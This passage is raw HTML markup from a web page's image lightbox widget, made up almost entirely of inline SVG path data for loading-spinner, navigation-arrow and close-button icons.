6-0.014-0.112-0.020-0.166-0.003-0.027-0.007-0.053-0.010-0.080s-0.004-0.053-0.006-0.078-0.007-0.101-0.011-0.15c-0.003-0.049-0.008-0.095-0.008-0.142-0.002-0.091-0.004-0.177-0.006-0.256 0.003-0.073 0.005-0.14 0.007-0.2 0.001-0.030 0.002-0.058 0.002-0.085 0.002-0.033 0.004-0.064 0.006-0.093 0.002-0.033 0.004-0.063 0.006-0.091 0.008-0.051 0.012-0.103 0.012-0.156 0-0.007-0-0.015-0.001-0.022 0-0.002 0-0.003 0-0.003h-0c-0.012-0.49-0.377-0.893-0.851-0.964z"></path><path class="fbx-icon-spinner-7" d="M16 6.5l-3.527-0.353 2.245-2.743-2.121-2.121-2.743 2.245-0.353-3.527h-3l-0.353 3.527-2.743-2.245-2.121 2.121 2.245 2.743-3.527 0.353v3l3.527 0.353-2.245 2.743 2.121 2.121 2.743-2.245 0.353 3.527h3l0.353-3.527 2.743 2.245 2.121-2.121-2.245-2.743 3.527-0.353v-3zM11 6.757v2.485l-1.757 1.757h-2.485l-1.757-1.757v-2.485l1.757-1.757h2.485l1.757 1.757z"></path><path class="fbx-icon-spinner-8" d="M13.657 2.343c-1.448-1.448-3.447-2.343-5.657-2.343-3.429 0-6.355 2.158-7.492 5.19l1.873 0.702c0.853-2.274 3.047-3.893 5.619-3.893 1.657 0 3.157 0.672 4.242 1.758l-2.242 2.242h6v-6l-2.343 2.343zM8 14c-1.657 0-3.157-0.672-4.242-1.758l2.242-2.242h-6v6l2.344-2.344c1.448 1.448 3.447 2.344 5.656 2.344 3.43 0 6.355-2.158 7.492-5.19l-1.873-0.702c-0.853 2.274-3.047 3.893-5.619 3.893z"></path><path class="fbx-icon-spinner-9" d="M8 3.25c-1.566 0-2.962 0.731-3.849 1.863l-1.2-0.9c1.161-1.496 2.992-2.464 5.048-2.464v-1.75l2.5 2.5-2.5 2.5v-1.75zM8 12.75c1.566 0 2.962-0.731 3.849-1.863l1.2 0.9c-1.161 1.496-2.992 2.464-5.048 2.464v1.75l-2.5-2.5 2.5-2.5v1.75zM3.15 8c0 1.568 0.78 2.961 1.98 3.827l-0.9 1.2c-1.564-1.139-2.58-2.968-2.58-5.026h-1.65l2.5-2.5 2.5 2.5h-1.85zM14.35 8h1.65l-2.5 2.5-2.5-2.5h1.85c0-1.568-0.78-2.961-1.98-3.827l0.9-1.2c1.564 1.139 2.58 2.968 2.58 5.026z"></path><path class="fbx-icon-spinner-10" d="M12.999 3.23v0 0zM13.032 8c1.631-1.56 2.423-3.087 1.896-4-0.301-0.521-0.99-0.77-1.929-0.77v0.75c0.659 0 1.137 0.148 1.28 0.395 0.113 0.195 0.050 0.496-0.023 0.713-0.139 0.417-0.442 0.917-0.876 1.444-0.263 0.32-0.567 0.643-0.904 0.963-0.465-0.402-0.982-0.801-1.544-1.188-0.055-0.679-0.142-1.327-0.257-1.93 0.878-0.26 1.675-0.397 2.323-0.397l0-0.75c-0 0-0 0-0 0-0.706 0-1.553 0.141-2.482 0.413-0.535-2.192-1.462-3.642-2.516-3.642s-1.981 1.45-2.516 3.642c-0.929-0.271-1.777-0.412-2.482-0.412-0.939 0-1.629 0.249-1.93 0.77-0.527 0.913 0.265 2.44 1.896 4-1.631 1.559-2.423 3.087-1.896 4 0.301 0.521 0.99 0.77 1.93 0.77 0.706 0 1.553-0.141 2.482-0.412 0.535 2.192 1.462 3.642 2.516 3.642s1.981-1.45 2.516-3.642c0.929 0.271 1.777 0.412 2.482 0.412 0.939 0 1.629-0.249 1.93-0.77 0.527-0.913-0.265-2.441-1.896-4zM11.915 8c-0.291 0.248-0.601 0.493-0.927 0.734 0.008-0.242 0.013-0.487 0.013-0.734s-0.004-0.492-0.013-0.734c0.327 0.241 0.637 0.486 0.927 0.734zM9.958 11.389c-0.36-0.128-0.728-0.274-1.098-0.435 0.213-0.113 0.426-0.232 0.64-0.355s0.424-0.25 0.63-0.378c-0.045 0.403-0.103 0.793-0.172 1.169zM9.125 9.949c-0.372 0.214-0.748 0.416-1.125 0.603-0.377-0.187-0.753-0.389-1.125-0.603-0.375-0.216-0.737-0.441-1.086-0.672-0.026-0.417-0.039-0.844-0.039-1.277s0.013-0.859 0.039-1.276c0.349-0.231 0.711-0.456 1.086-0.672 0.372-0.215 0.748-0.416 1.125-0.603 0.377 0.187 0.753 0.389 1.125 0.603 0.375 0.216 0.737 0.441 1.086 0.672 0.026 0.417 0.039 0.844 0.039 1.276s-0.013 0.859-0.039 1.277c-0.349 0.231-0.711 0.456-1.086 0.672zM5.87 10.22c0.205 0.128 0.415 0.254 0.63 0.378s0.427 0.242 0.64 0.355c-0.37 0.162-0.738 0.307-1.098 0.435-0.069-0.375-0.127-0.766-0.172-1.168zM5.013 8.734c-0.327-0.241-0.637-0.486-0.927-0.734 0.291-0.248 0.601-0.494 0.927-0.734-0.008 0.242-0.013 0.487-0.013 0.734s0.004 0.492 0.013 0.734zM6.042 4.612c0.36 0.128 0.728 0.274 1.098 0.435-0.213 0.113-0.426 0.232-0.64 0.355s-0.424 0.25-0.63 0.378c0.045-0.403 0.103-0.793 0.172-1.168zM9.5 5.402c-0.214-0.123-0.427-0.242-0.64-0.355 0.37-0.162 0.738-0.307 1.098-0.435 0.069 0.375 0.127 0.766 0.172 1.168-0.205-0.128-0.415-0.254-0.63-0.378zM6.581 2.607c0.24-0.639 0.521-1.151 0.813-1.48 0.152-0.172 0.381-0.376 0.607-0.376s0.454 0.205 0.607 0.376c0.292 0.329 0.573 0.841 0.813 1.48 0.146 0.388 0.273 0.812 0.382 1.265-0.58 0.202-1.185 0.45-1.801 0.743-0.616-0.292-1.221-0.541-1.801-0.743 0.109-0.453 0.237-0.877 0.382-1.265zM2.62 6.532c-0.434-0.527-0.736-1.026-0.876-1.444-0.073-0.218-0.135-0.518-0.023-0.713 0.143-0.247 0.621-0.395 1.28-0.395h0c0.648 0 1.445 0.137 2.323 0.397-0.115 0.603-0.202 1.251-0.257 1.93-0.561 0.387-1.079 0.787-1.544 1.188-0.338-0.321-0.641-0.643-0.904-0.963zM3.002 12.020c-0.659 0-1.137-0.148-1.28-0.395-0.113-0.195-0.050-0.496 0.023-0.713 0.139-0.417 0.442-0.917 0.876-1.444 0.263-0.32 0.567-0.643 0.904-0.963 0.465 0.402 0.982 0.801 1.544 1.188 0.055 0.679 0.142 1.327 0.257 1.93-0.878 0.26-1.675 0.397-2.323 0.397zM9.419 13.393c-0.24 0.639-0.521 1.151-0.813 1.48-0.152 0.172-0.381 0.376-0.607 0.376s-0.454-0.205-0.607-0.376c-0.292-0.329-0.573-0.841-0.813-1.48-0.146-0.388-0.273-0.812-0.382-1.265 0.58-0.202 1.185-0.45 1.801-0.743 0.616 0.292 1.221 0.541 1.801 0.743-0.109 0.453-0.236 0.877-0.382 1.265zM14.256 10.912c0.073 0.218 0.135 0.518 0.023 0.713-0.143 0.248-0.622 0.395-1.28 0.395-0.648 0-1.445-0.137-2.323-0.397 0.115-0.603 0.202-1.251 0.257-1.93 0.561-0.387 1.079-0.787 1.544-1.188 0.338 0.321 0.641 0.643 0.904 0.963 0.434 0.527 0.736 1.027 0.876 1.444zM6.75 8c0-0.69 0.56-1.25 1.25-1.25s1.25 0.56 1.25 1.25c0 0.69-0.56 1.25-1.25 1.25s-1.25-0.56-1.25-1.25z"></path><path class="fbx-icon-spinner-11" d="M7.282 8.718l-5-5-2.282 2.282v-6h6l-2.282 2.282 5 5zM8 0c4.418 0 8 3.582 8 8s-3.582 8-8 8c-4.418 0-8-3.582-8-8h2c0 3.314 2.686 6 6 6s6-2.686 6-6c0-3.314-2.686-6-6-6v-2z"></path></svg></div><div class="fbx-inner fbx-inner-shadow"><div class="fbx-stage"><div class="fbx-item-current"></div><div class="fbx-item-next"></div><div class="fbx-caption fbx-slide-caption"></div></div><button class="fbx-prev fbx-btn-transition fbx-btn-shadow"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="fbx-icon fbx-icon-prev fbx-icon-default"><path class="fbx-icon-arrows-default" d="M14.57 8.643q0 0.473-0.29 0.808t-0.754 0.335h-6.286l2.616 2.625q0.339 0.321 0.339 0.804t-0.339 0.804l-0.67 0.679q-0.33 0.33-0.804 0.33-0.464 0-0.813-0.33l-5.813-5.821q-0.33-0.33-0.33-0.804 0-0.464 0.33-0.813l5.813-5.804q0.339-0.339 0.813-0.339 0.464 0 0.804 0.339l0.67 0.661q0.339 0.339 0.339 0.813t-0.339 0.813l-2.616 2.616h6.286q0.464 0 0.754 0.335t0.29 0.808z"></path><path class="fbx-icon-arrows-flat" d="M6.667 3q0.276 0 0.471 0.195t0.195 0.471q0 0.281-0.198 0.474l-3.526 3.526h10.391q0.276 0 0.471 0.195t0.195 0.471-0.195 0.471-0.471 0.195h-10.391l3.526 3.526q0.198 0.193 0.198 0.474 0 0.276-0.195 0.471t-0.471 0.195q-0.281 0-0.474-0.193l-4.667-4.667q-0.193-0.203-0.193-0.474t0.193-0.474l4.667-4.667q0.198-0.193 0.474-0.193z"></path><path class="fbx-icon-arrows-1" d="M10 16l3-3-5-5 5-5-3-3-8 8z"></path><path class="fbx-icon-arrows-2" d="M0 8l16 7-3-7 3-7z"></path><path class="fbx-icon-arrows-3" d="M12 0l-8 8 8 8-4-8z"></path><path class="fbx-icon-arrows-4" d="M10 4l-4 4 4 4z"></path><path class="fbx-icon-arrows-5" d="M0 8l8 8v-5h8l0-6h-8v-5l-8 8zM2.375 7.039l0.25-0.25v2.422l-0.25-0.25v-1.922zM2.125 8.711l-0.25-0.25v-0.922l0.25-0.25v1.422zM2.875 6.539l0.25-0.25v3.422l-0.25-0.25v-2.922zM3.375 6.039l0.25-0.25v4.422l-0.25-0.25v-3.922zM3.875 5.539l0.25-0.25v5.422l-0.25-0.25v-4.922zM4.375 5.039l0.25-0.25v6.422l-0.25-0.25v-5.922zM4.875 4.539l0.25-0.25v7.422l-0.25-0.25v-6.922zM5.375 4.039l0.25-0.25v8.422l-0.25-0.25v-7.922zM5.875 3.539l0.25-0.25v9.422l-0.25-0.25v-8.922zM6.375 3.039l0.25-0.25v10.422l-0.25-0.25v-9.922zM1.625 7.789v0.422l-0.211-0.211 0.211-0.211zM7.375 10v-4h0.25v4h-0.25zM7.875 10v-4h0.25v4h-0.25zM8.375 10v-4h0.25v4h-0.25zM8.875 10v-4h0.25v4h-0.25zM9.375 10v-4h0.25v4h-0.25zM9.875 10v-4h0.25v4h-0.25zM10.375 10v-4h0.25v4h-0.25zM10.875 10v-4h0.25v4h-0.25zM11.375 10v-4h0.25v4h-0.25zM11.875 10v-4h0.25v4h-0.25zM12.375 10v-4h0.25v4h-0.25zM12.875 10v-4h0.25v4h-0.25zM13.375 10v-4h0.25v4h-0.25zM13.875 10v-4h0.25v4h-0.25zM14.375 10v-4h0.25v4h-0.25zM15 10h-0.125v-4h0.125l-0 4zM7 6h0.125v4h-0.125v3.586l-0.125-0.125v-10.922l0.125-0.125v3.586z"></path><path class="fbx-icon-arrows-6" d="M0 8l8 8v-5h8l0-6h-8v-5z"></path><path class="fbx-icon-arrows-7" d="M8 0c4.418 0 8 3.582 8 8s-3.582 8-8 8-8-3.582-8-8 3.582-8 8-8zM3.293 8.707l4 4c0.195 0.195 0.451 0.293 0.707 0.293s0.512-0.098 0.707-0.293c0.391-0.391 0.391-1.024 0-1.414l-2.293-2.293h5.586c0.552 0 1-0.448 1-1s-0.448-1-1-1h-5.586l2.293-2.293c0.391-0.391 0.391-1.024 0-1.414s-1.024-0.391-1.414 0l-4 4c-0.391 0.391-0.391 1.024-0 1.414z"></path><path class="fbx-icon-arrows-8" d="M0 16h16v-16h-16l0 16zM14 2v12h-12l-0-12h12zM7 11.5l-3.5-3.5 3.5-3.5v2.5h5v2h-5v2.5z"></path><path class="fbx-icon-arrows-9" d="M15 5h1v6h-1zM13 5h1v6h-1zM11 5h1v6h-1zM0 8l7-7v4h3v6h-3v4z"></path><path class="fbx-icon-arrows-10" d="M8 0c4.418 0 8 3.582 8 8s-3.582 8-8 8-8-3.582-8-8 3.582-8 8-8zM7 11.5v-2.5h5v-2h-5v-2.5l-3.5 3.5 3.5 3.5z"></path><path class="fbx-icon-arrows-11" d="M8 0c4.418 0 8 3.582 8 8s-3.582 8-8 8-8-3.582-8-8 3.582-8 8-8zM8 14.5c3.59 0 6.5-2.91 6.5-6.5s-2.91-6.5-6.5-6.5-6.5 2.91-6.5 6.5 2.91 6.5 6.5 6.5zM3.293 7.293l4-4c0.391-0.391 1.024-0.391 1.414 0s0.391 1.024 0 1.414l-2.293 2.293h5.586c0.552 0 1 0.448 1 1s-0.448 1-1 1h-5.586l2.293 2.293c0.391 0.391 0.391 1.024 0 1.414-0.195 0.195-0.451 0.293-0.707 0.293s-0.512-0.098-0.707-0.293l-4-4c-0.39-0.391-0.39-1.024 0-1.414z"></path></svg></button><span class="fbx-count"></span><button class="fbx-next fbx-btn-transition fbx-btn-shadow"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="fbx-icon fbx-icon-next fbx-icon-default"><path class="fbx-icon-arrows-default" d="M14.57 8.071q0 0.482-0.33 0.813l-5.813 5.813q-0.348 0.33-0.813 0.33-0.455 0-0.804-0.33l-0.67-0.67q-0.339-0.339-0.339-0.813t0.339-0.813l2.616-2.616h-6.286q-0.464 0-0.754-0.335t-0.29-0.808v-1.143q0-0.473 0.29-0.808t0.754-0.335h6.286l-2.616-2.625q-0.339-0.321-0.339-0.804t0.339-0.804l0.67-0.67q0.339-0.339 0.804-0.339 0.473 0 0.813 0.339l5.813 5.813q0.33 0.313 0.33 0.804z"></path><path class="fbx-icon-arrows-flat" d="M9.333 3q0.281 0 0.474 0.193l4.667 4.667q0.193 0.193 0.193 0.474t-0.193 0.474l-4.667 4.667q-0.193 0.193-0.474 0.193-0.286 0-0.477-0.19t-0.19-0.477q0-0.281 0.193-0.474l3.531-3.526h-10.391q-0.276 0-0.471-0.195t-0.195-0.471 0.195-0.471 0.471-0.195h10.391l-3.531-3.526q-0.193-0.193-0.193-0.474 0-0.286 0.19-0.477t0.477-0.19z"></path><path class="fbx-icon-arrows-1" d="M6 0l-3 3 5 5-5 5 3 3 8-8z"></path><path class="fbx-icon-arrows-2" d="M16 8l-16-7 3 7-3 7z"></path><path class="fbx-icon-arrows-3" d="M4 16l8-8-8-8 4 8z"></path><path class="fbx-icon-arrows-4" d="M6 12l4-4-4-4z"></path><path class="fbx-icon-arrows-5" d="M16 8l-8-8v5h-8l-0 6h8v5l8-8zM13.625 8.961l-0.25 0.25v-2.422l0.25 0.25v1.922zM13.875 7.289l0.25 0.25v0.922l-0.25 0.25v-1.422zM13.125 9.461l-0.25 0.25v-3.422l0.25 0.25v2.922zM12.625 9.961l-0.25 0.25v-4.422l0.25 0.25v3.922zM12.125 10.461l-0.25 0.25v-5.422l0.25 0.25v4.922zM11.625 10.961l-0.25 0.25v-6.422l0.25 0.25v5.922zM11.125 11.461l-0.25 0.25v-7.422l0.25 0.25v6.922zM10.625 11.961l-0.25 0.25v-8.422l0.25 0.25v7.922zM10.125 12.461l-0.25 0.25v-9.422l0.25 0.25v8.922zM9.625 12.961l-0.25 0.25v-10.422l0.25 0.25v9.922zM14.375 8.211v-0.422l0.211 0.211-0.211 0.211zM8.625 6v4h-0.25v-4h0.25zM8.125 6v4h-0.25v-4h0.25zM7.625 6v4h-0.25v-4h0.25zM7.125 6v4h-0.25v-4h0.25zM6.625 6v4h-0.25v-4h0.25zM6.125 6v4h-0.25v-4h0.25zM5.625 6v4h-0.25v-4h0.25zM5.125 6v4h-0.25v-4h0.25zM4.625 6v4h-0.25v-4h0.25zM4.125 6v4h-0.25v-4h0.25zM3.625 6v4h-0.25v-4h0.25zM3.125 6v4h-0.25v-4h0.25zM2.625 6v4h-0.25v-4h0.25zM2.125 6v4h-0.25v-4h0.25zM1.625 6v4h-0.25v-4h0.25zM1 6h0.125v4h-0.125l0-4zM9 10h-0.125v-4h0.125v-3.586l0.125 0.125v10.922l-0.125 0.125v-3.586z"></path><path class="fbx-icon-arrows-6" d="M16 8l-8-8v5h-8l-0 6h8v5z"></path><path class="fbx-icon-arrows-7" d="M8 0c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM12.707 8.707l-4 4c-0.195 0.195-0.451 0.293-0.707 0.293s-0.512-0.098-0.707-0.293c-0.391-0.391-0.391-1.024 0-1.414l2.293-2.293h-5.586c-0.552 0-1-0.448-1-1s0.448-1 1-1h5.586l-2.293-2.293c-0.391-0.391-0.391-1.024 0-1.414s1.024-0.391 1.414 0l4 4c0.391 0.391 0.391 1.024 0 1.414z"></path><path class="fbx-icon-arrows-8" d="M16 16h-16v-16h16l-0 16zM2 2v12h12l0-12h-12zM9 11.5l3.5-3.5-3.5-3.5v2.5h-5v2h5v2.5z"></path><path class="fbx-icon-arrows-9" d="M0 5h1v6h-1zM2 5h1v6h-1zM4 5h1v6h-1zM16 8l-7-7v4h-3v6h3v4z"></path><path class="fbx-icon-arrows-10" d="M8 0c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM9 11.5v-2.5h-5v-2h5v-2.5l3.5 3.5-3.5 3.5z"></path><path class="fbx-icon-arrows-11" d="M8 0c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM8 14.5c-3.59 0-6.5-2.91-6.5-6.5s2.91-6.5 6.5-6.5 6.5 2.91 6.5 6.5-2.91 6.5-6.5 6.5zM12.707 7.293l-4-4c-0.39-0.391-1.024-0.391-1.414 0s-0.391 1.024 0 1.414l2.293 2.293h-5.586c-0.552 0-1 0.448-1 1s0.448 1 1 1h5.586l-2.293 2.293c-0.391 0.391-0.391 1.024 0 1.414 0.195 0.195 0.451 0.293 0.707 0.293s0.512-0.098 0.707-0.293l4-4c0.39-0.391 0.39-1.024 0-1.414z"></path></svg></button><button class="fbx-close fbx-btn-transition fbx-btn-shadow"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="fbx-icon fbx-icon-close fbx-icon-default"><path class="fbx-icon-close-default" d="M13.405 11.404q0 0.357-0.25 0.607l-1.214 1.214q-0.25 0.25-0.607 0.25t-0.607-0.25l-2.625-2.625-2.625 2.625q-0.25 0.25-0.607 0.25t-0.607-0.25l-1.214-1.214q-0.25-0.25-0.25-0.607t0.25-0.607l2.625-2.625-2.625-2.625q-0.25-0.25-0.25-0.607t0.25-0.607l1.214-1.214q0.25-0.25 0.607-0.25t0.607 0.25l2.625 2.625 2.625-2.625q0.25-0.25 0.607-0.25t0.607 0.25l1.214 1.214q0.25 0.25 0.25 0.607t-0.25 0.607l-2.625 2.625 2.625 2.625q0.25 0.25 0.25 0.607z"></path><path class="fbx-icon-close-flat" d="M12.667 3q0.286 0 0.477 0.19t0.19 0.477q0 0.281-0.193 0.474l-4.198 4.193 4.198 4.193q0.193 0.193 0.193 0.474 0 0.286-0.19 0.477t-0.477 0.19q-0.281 0-0.474-0.193l-4.193-4.198-4.193 4.198q-0.193 0.193-0.474 0.193-0.286 0-0.477-0.19t-0.19-0.477q0-0.281 0.193-0.474l4.198-4.193-4.198-4.193q-0.193-0.193-0.193-0.474 0-0.286 0.19-0.477t0.477-0.19q0.281 0 0.474 0.193l4.193 4.198 4.193-4.198q0.193-0.193 0.474-0.193z"></path></svg></button><button class="fbx-open-caption">…</button></div></div><div class="fbx-modal fbx-3 fbx-rounded fbx-light fbx-chrome fbx-no-count fbx-no-buttons fbx-desktop fbx-landscape" tabindex="0"><div class="fbx-inner-spacer"></div><div class="fbx-loader"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="fbx-icon fbx-icon-spinner fbx-icon-default"><path class="fbx-icon-spinner-default" d="M3 8c0-0.19 0.011-0.378 0.032-0.563l-2.89-0.939c-0.092 0.487-0.141 0.989-0.141 1.502 0 2.3 0.971 4.374 2.526 5.833l1.786-2.458c-0.814-0.889-1.312-2.074-1.312-3.375zM13 8c0 1.301-0.497 2.486-1.312 3.375l1.786 2.458c1.555-1.459 2.526-3.533 2.526-5.833 0-0.513-0.049-1.015-0.141-1.502l-2.89 0.939c0.021 0.185 0.032 0.373 0.032 0.563zM9 3.1c1.436 0.292 2.649 1.199 3.351 2.435l2.89-0.939c-1.144-2.428-3.473-4.188-6.241-4.534v3.038zM3.649 5.535c0.702-1.236 1.914-2.143 3.351-2.435v-3.038c-2.769 0.345-5.097 2.105-6.241 4.534l2.89 0.939zM10.071 12.552c-0.631 0.288-1.332 0.448-2.071 0.448s-1.44-0.16-2.071-0.448l-1.786 2.458c1.144 0.631 2.458 0.99 3.857 0.99s2.713-0.359 3.857-0.99l-1.786-2.458z"></path><path class="fbx-icon-spinner-flat" d="M10.833 10.495q0.271 0 0.469 0.198l1.885 1.885q0.198 0.198 0.198 0.474 0 0.271-0.198 0.469t-0.469 0.198q-0.276 0-0.474-0.198l-1.885-1.885q-0.193-0.193-0.193-0.474 0-0.276 0.195-0.471t0.471-0.195zM5.172 10.495q0.276 0 0.471 0.195t0.195 0.471-0.198 0.474l-1.885 1.885q-0.198 0.198-0.469 0.198-0.276 0-0.471-0.195t-0.195-0.471q0-0.281 0.193-0.474l1.885-1.885q0.198-0.198 0.474-0.198zM1.333 7.667h2.667q0.276 0 0.471 0.195t0.195 0.471-0.195 0.471-0.471 0.195h-2.667q-0.276 0-0.471-0.195t-0.195-0.471 0.195-0.471 0.471-0.195zM8 11.667q0.276 0 0.471 0.195t0.195 0.471v2.667q0 0.276-0.195 0.471t-0.471 0.195-0.471-0.195-0.195-0.471v-2.667q0-0.276 0.195-0.471t0.471-0.195zM3.286 2.948q0.271 0 0.469 0.198l1.885 1.885q0.198 0.198 0.198 0.469 0 0.276-0.195 0.471t-0.471 0.195q-0.281 0-0.474-0.193l-1.885-1.885q-0.193-0.193-0.193-0.474 0-0.276 0.195-0.471t0.471-0.195zM12 7.667h2.667q0.276 0 0.471 0.195t0.195 0.471-0.195 0.471-0.471 0.195h-2.667q-0.276 0-0.471-0.195t-0.195-0.471 0.195-0.471 0.471-0.195zM8 1q0.276 0 0.471 0.195t0.195 0.471v2.667q0 0.276-0.195 0.471t-0.471 0.195-0.471-0.195-0.195-0.471v-2.667q0-0.276 0.195-0.471t0.471-0.195zM12.719 2.948q0.271 0 0.469 0.198t0.198 0.469q0 0.276-0.198 0.474l-1.885 1.885q-0.193 0.193-0.469 0.193-0.286 0-0.477-0.19t-0.19-0.477q0-0.276 0.193-0.469l1.885-1.885q0.198-0.198 0.474-0.198z"></path><path class="fbx-icon-spinner-1" d="M5.569 12q0 0.536-0.379 0.911t-0.906 0.375q-0.536 0-0.911-0.375t-0.375-0.911 0.375-0.911 0.911-0.375q0.527 0 0.906 0.375t0.379 0.911zM9.426 13.714q0 0.473-0.335 0.808t-0.808 0.335-0.808-0.335-0.335-0.808 0.335-0.808 0.808-0.335 0.808 0.335 0.335 0.808zM3.857 8q0 0.589-0.42 1.009t-1.009 0.42-1.009-0.42-0.42-1.009 0.42-1.009 1.009-0.42 1.009 0.42 0.42 1.009zM13.283 12q0 0.411-0.295 0.705t-0.705 0.295-0.705-0.295-0.295-0.705 0.295-0.705 0.705-0.295 0.705 0.295 0.295 0.705zM5.854 4q0 0.652-0.46 1.112t-1.112 0.46-1.112-0.46-0.46-1.112 0.46-1.112 1.112-0.46 1.112 0.46 0.46 1.112zM9.997 2.286q0 0.714-0.5 1.214t-1.214 0.5-1.214-0.5-0.5-1.214 0.5-1.214 1.214-0.5 1.214 0.5 0.5 1.214zM14.844 8q0 0.357-0.25 0.607t-0.607 0.25-0.607-0.25-0.25-0.607 0.25-0.607 0.607-0.25 0.607 0.25 0.25 0.607zM12.997 4q0 0.295-0.21 0.504t-0.504 0.21-0.504-0.21-0.21-0.504 0.21-0.504 0.504-0.21 0.504 0.21 0.21 0.504z"></path><path class="fbx-icon-spinner-2" d="M16 8c-0.020-1.045-0.247-2.086-0.665-3.038-0.417-0.953-1.023-1.817-1.766-2.53s-1.624-1.278-2.578-1.651c-0.953-0.374-1.978-0.552-2.991-0.531-1.013 0.020-2.021 0.24-2.943 0.646-0.923 0.405-1.758 0.992-2.449 1.712s-1.237 1.574-1.597 2.497c-0.361 0.923-0.533 1.914-0.512 2.895 0.020 0.981 0.234 1.955 0.627 2.847 0.392 0.892 0.961 1.7 1.658 2.368s1.523 1.195 2.416 1.543c0.892 0.348 1.851 0.514 2.799 0.493 0.949-0.020 1.89-0.227 2.751-0.608 0.862-0.379 1.642-0.929 2.287-1.604s1.154-1.472 1.488-2.335c0.204-0.523 0.342-1.069 0.415-1.622 0.019 0.001 0.039 0.002 0.059 0.002 0.552 0 1-0.448 1-1 0-0.028-0.001-0.056-0.004-0.083h0.004zM14.411 10.655c-0.367 0.831-0.898 1.584-1.55 2.206s-1.422 1.112-2.254 1.434c-0.832 0.323-1.723 0.476-2.608 0.454-0.884-0.020-1.759-0.215-2.56-0.57-0.801-0.354-1.526-0.867-2.125-1.495s-1.071-1.371-1.38-2.173c-0.31-0.801-0.457-1.66-0.435-2.512s0.208-1.694 0.551-2.464c0.342-0.77 0.836-1.468 1.441-2.044s1.321-1.029 2.092-1.326c0.771-0.298 1.596-0.438 2.416-0.416s1.629 0.202 2.368 0.532c0.74 0.329 1.41 0.805 1.963 1.387s0.988 1.27 1.272 2.011c0.285 0.74 0.418 1.532 0.397 2.32h0.004c-0.002 0.027-0.004 0.055-0.004 0.083 0 0.516 0.39 0.94 0.892 0.994-0.097 0.544-0.258 1.075-0.481 1.578z"></path><path class="fbx-icon-spinner-3" d="M7 4c0-0.552 0.448-1 1-1s1 0.448 1 1c0 0.552-0.448 1-1 1s-1-0.448-1-1zM8 0c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM8 13c-0.552 0-1-0.448-1-1s0.448-1 1-1c0.552 0 1 0.448 1 1s-0.448 1-1 1zM8 8c-1.795 0-3.25 1.455-3.25 3.25s1.455 3.25 3.25 3.25c-3.59 0-6.5-2.91-6.5-6.5s2.91-6.5 6.5-6.5c1.795 0 3.25 1.455 3.25 3.25s-1.455 3.25-3.25 3.25z"></path><path class="fbx-icon-spinner-4" d="M6 2c0-1.105 0.895-2 2-2s2 0.895 2 2c0 1.105-0.895 2-2 2s-2-0.895-2-2zM10.243 3.757c0-1.105 0.895-2 2-2s2 0.895 2 2c0 1.105-0.895 2-2 2s-2-0.895-2-2zM13 8c0-0.552 0.448-1 1-1s1 0.448 1 1c0 0.552-0.448 1-1 1s-1-0.448-1-1zM11.243 12.243c0-0.552 0.448-1 1-1s1 0.448 1 1c0 0.552-0.448 1-1 1s-1-0.448-1-1zM7 14c0 0 0 0 0 0 0-0.552 0.448-1 1-1s1 0.448 1 1c0 0 0 0 0 0 0 0.552-0.448 1-1 1s-1-0.448-1-1zM2.757 12.243c0 0 0 0 0 0 0-0.552 0.448-1 1-1s1 0.448 1 1c0 0 0 0 0 0 0 0.552-0.448 1-1 1s-1-0.448-1-1zM2.257 3.757c0 0 0 0 0 0 0-0.828 0.672-1.5 1.5-1.5s1.5 0.672 1.5 1.5c0 0 0 0 0 0 0 0.828-0.672 1.5-1.5 1.5s-1.5-0.672-1.5-1.5zM0.875 8c0-0.621 0.504-1.125 1.125-1.125s1.125 0.504 1.125 1.125c0 0.621-0.504 1.125-1.125 1.125s-1.125-0.504-1.125-1.125z"></path><path class="fbx-icon-spinner-5" d="M8 0c-4.355 0-7.898 3.481-7.998 7.812 0.092-3.779 2.966-6.812 6.498-6.812 3.59 0 6.5 3.134 6.5 7 0 0.828 0.672 1.5 1.5 1.5s1.5-0.672 1.5-1.5c0-4.418-3.582-8-8-8zM8 16c4.355 0 7.898-3.481 7.998-7.812-0.092 3.779-2.966 6.812-6.498 6.812-3.59 0-6.5-3.134-6.5-7 0-0.828-0.672-1.5-1.5-1.5s-1.5 0.672-1.5 1.5c0 4.418 3.582 8 8 8z"></path><path class="fbx-icon-spinner-6" d="M0.001 8.025l-0 0c0 0 0 0.001 0 0.003 0.002 0.061 0.009 0.12 0.021 0.177 0.003 0.027 0.007 0.057 0.011 0.090 0.003 0.029 0.007 0.061 0.011 0.095 0.006 0.040 0.012 0.083 0.019 0.128 0.013 0.090 0.028 0.189 0.045 0.296 0.021 0.101 0.044 0.21 0.068 0.326 0.011 0.058 0.028 0.117 0.044 0.178s0.032 0.123 0.049 0.188c0.009 0.032 0.016 0.065 0.027 0.097s0.021 0.065 0.031 0.098 0.043 0.134 0.065 0.203c0.006 0.017 0.011 0.035 0.017 0.052s0.013 0.034 0.019 0.052 0.026 0.070 0.039 0.105c0.027 0.070 0.053 0.142 0.081 0.215 0.031 0.071 0.062 0.144 0.094 0.218 0.016 0.037 0.032 0.074 0.048 0.111s0.035 0.073 0.053 0.111 0.073 0.148 0.11 0.224c0.039 0.075 0.081 0.149 0.123 0.224 0.021 0.037 0.042 0.075 0.063 0.113s0.045 0.074 0.068 0.112 0.093 0.149 0.14 0.224c0.198 0.295 0.417 0.587 0.66 0.864 0.245 0.275 0.511 0.535 0.792 0.775 0.284 0.236 0.582 0.452 0.886 0.642 0.306 0.188 0.619 0.349 0.928 0.487 0.078 0.032 0.156 0.063 0.232 0.095 0.038 0.015 0.076 0.032 0.115 0.046s0.077 0.027 0.115 0.041 0.151 0.054 0.226 0.078c0.075 0.022 0.15 0.044 0.224 0.066 0.037 0.011 0.073 0.022 0.109 0.031s0.073 0.018 0.109 0.027 0.143 0.035 0.213 0.052c0.070 0.014 0.139 0.027 0.207 0.040 0.034 0.006 0.067 